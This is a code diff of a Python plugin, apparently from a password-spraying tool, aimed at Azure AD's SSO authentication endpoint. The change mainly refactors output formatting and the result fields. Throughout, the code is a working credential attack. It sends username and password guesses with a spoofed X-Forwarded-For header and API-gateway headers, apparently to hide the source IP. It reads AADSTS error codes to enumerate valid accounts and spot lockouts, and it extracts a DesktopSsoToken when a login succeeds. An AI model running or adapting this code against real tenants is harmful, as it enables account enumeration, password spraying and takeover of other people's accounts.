@@ -1,29 +1,15 @@
-import datetime, requests, uuid, re
+import requests, uuid, re
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 
 def azuresso_authenticate(url, username, password, useragent, pluginargs):
 
-    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-
     data_response = {
-        'timestamp': ts,
-        'username': username,
-        'password': password,
-        'success': False,
-        'change': False,
-        '2fa_enabled': False,
-        'type': None,
-        'code': None,
-        'name': None,
-        'action': None,
-        'headers': [],
-        'cookies': [],
-        'sourceip' : None,
-        'throttled' : False,
-		'error' : False,
-        'output' : ""
+        'result' : None,    # Can be "success", "failure" or "potential"
+        'error' : False,
+        'output' : "",
+        'valid_user' : False
     }
 
     if "@" not in username:
@@ -79,57 +65,60 @@ def azuresso_authenticate(url, username, password, useragent, pluginargs):
     trace_id = utils.generate_trace_id()
 
     headers = {
-        'User-Agent': useragent,
+        'User-Agent' : useragent,
         "X-My-X-Forwarded-For" : spoofed_ip,
         "x-amzn-apigateway-api-id" : amazon_id,
         "X-My-X-Amzn-Trace-Id" : trace_id,
 
-        'client-request-id': requestid,
-        'return-client-request-id':'true',
-        'Content-type':'application/soap+xml; charset=utf-8'
+        'client-request-id' : requestid,
+        'return-client-request-id' : 'true',
+        'Content-type' : 'application/soap+xml; charset=utf-8'
     }
 
     headers = utils.add_custom_headers(pluginargs, headers)
 
     try:
-        r = requests.post("{url}/{domain}/winauth/trust/2005/usernamemixed?client-request-id={requestid}".format(url=url,domain=pluginargs['domain'],requestid=requestid), data=tempdata, headers=headers, verify=False, timeout=30)
+        r = requests.post(f"{url}/{pluginargs['domain']}/winauth/trust/2005/usernamemixed?client-request-id={requestid}", data=tempdata, headers=headers, verify=False, timeout=30)
 
         xmlresponse = str(r.content)
         creds = username + ":" + password
 
         # check our resopnse for error/response codes
         if "AADSTS50034" in xmlresponse:
-            data_response['output'] = "[-] Username not found: {}".format(creds)
-            data_response['success'] = False
+            data_response['output'] = f"[-] FAILURE: Username not found - {creds}"
+            data_response['result'] = "failure"
 
         elif "AADSTS50126" in xmlresponse:
-            data_response['output'] = "[+] VALID USERNAME, invalid password: {}".format(creds)
-            data_response['success'] = False
+            data_response['output'] = f"[!] VALID_USERNAME - {creds} (invalid password)"
+            data_response['result'] = "failure"
+            data_response['valid_user'] = True
 
         elif "DesktopSsoToken" in xmlresponse:
-            data_response['output'] = "[+] VALID CREDS : {}".format(creds)
-            data_response['success'] = True
+            data_response['output'] = f"[+] SUCCESS: {creds}"
+            data_response['result'] = "success"
+            data_response['valid_user'] = True
 
             token = re.findall(r"<DesktopSsoToken>.{1,}</DesktopSsoToken>", xmlresponse)
             if (token):
-                data_response['output'] += " - GOT TOKEN {}".format(token[0])
+                data_response['output'] += f" - GOT TOKEN {token[0]}"
 
         elif "AADSTS50056" in xmlresponse:
-            data_response['output'] = "[+] VALID USERNAME, no password in AzureAD: {}".format(creds)
-            data_response['success'] = False
+            data_response['output'] = f"[!] VALID_USERNAME - {creds} (no password in AzureAD)"
+            data_response['result'] = "failure"
+            data_response['valid_user'] = True
 
         elif "AADSTS80014" in xmlresponse:
-            data_response['output'] = "[+] VALID USERNAME, max pass-through authentication time exceeded :{}".format(creds)
-            data_response['success'] = False
+            data_response['output'] = f"[!] VALID_USERNAME - {creds} (max pass-through authentication time exceeded)"
+            data_response['result'] = "failure"
+            data_response['valid_user'] = True
 
         elif "AADSTS50053" in xmlresponse:
-            data_response['output'] = "[?] SMART LOCKOUT DETECTED - Unable to enumerate:{}".format(creds)
-            data_response['success'] = False
+            data_response['output'] = f"[?] WARNING: SMART LOCKOUT DETECTED - Unable to enumerate: {creds}"
+            data_response['result'] = "potential"
 
         else:
-            data_response['output'] = "[!] Unknown Response : {}".format(creds)
-            data_response['success'] = False
-
+            data_response['output'] = f"[?] Unknown Response : {creds}"
+            data_response['result'] = "failure"
 
 
     except Exception as ex:
